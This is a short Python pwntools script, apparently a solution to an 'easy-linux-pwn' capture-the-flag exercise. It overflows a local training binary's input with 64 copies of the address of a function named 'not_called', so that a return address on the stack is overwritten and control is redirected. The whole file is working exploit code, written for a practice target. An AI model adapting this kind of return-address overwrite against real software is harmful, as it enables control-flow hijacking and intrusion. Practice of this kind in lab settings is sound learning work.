#!/usr/bin/python

# overwrite any of the return addresses on stack with the address of `not_called()`.

import struct
import sys

from pwn import *

context(arch='amd64', os='linux', endian='little', word_size=64)

binary_path = '/home/gbrls/ctf/easy-linux-pwn/bin/x86-64/02-overwrite-ret'

p = process(binary_path)
#p = gdb.debug(binary_path)

addr = p.elf.symbols['not_called']

payload = b''
payload += p64(addr) * 64

p.readuntil('> ')
p.write(payload)
p.interactive()
